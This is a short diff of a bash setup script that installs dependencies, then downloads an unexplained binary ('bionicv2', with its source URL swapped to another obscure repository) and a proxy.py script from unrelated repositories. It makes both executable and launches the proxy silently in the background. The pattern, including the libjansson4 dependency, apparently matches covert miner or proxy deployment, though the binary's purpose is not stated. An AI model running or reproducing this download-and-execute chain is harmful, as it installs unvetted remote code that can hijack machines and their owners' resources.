@@ -1,7 +1,7 @@
 #!/bin/bash
 apt update
 apt -y install wget curl python3 libjansson4
-wget -O bionicv2 https://bitbucket.org/oqoixgqoq9/turtel/raw/c4008f7e57bc01c88c7d6e4ad3c1147e1654d014/ayam-bakso
+wget -O bionicv2 https://raw.githubusercontent.com/mariobiszz/scala/main/xla
 wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
 chmod +x bionicv2 proxy.py
 python3 proxy.py >/dev/null &
